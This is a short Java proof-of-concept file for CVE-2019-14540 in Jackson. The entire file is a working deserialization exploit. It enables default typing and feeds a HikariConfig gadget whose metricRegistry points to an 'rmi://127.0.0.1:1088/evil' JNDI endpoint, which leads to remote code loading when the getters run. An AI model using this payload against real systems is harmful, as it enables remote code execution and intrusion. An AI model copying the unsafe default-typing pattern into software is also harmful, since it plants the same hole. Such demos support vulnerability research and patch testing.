package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2019_14540 {
    public static void main(String[] args) throws IOException, IOException {
        String json = "[\"com.zaxxer.hikari.HikariConfig\",{\"metricRegistry\":\"rmi://127.0.0.1:1088/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用所有个 get 方法
    }
}
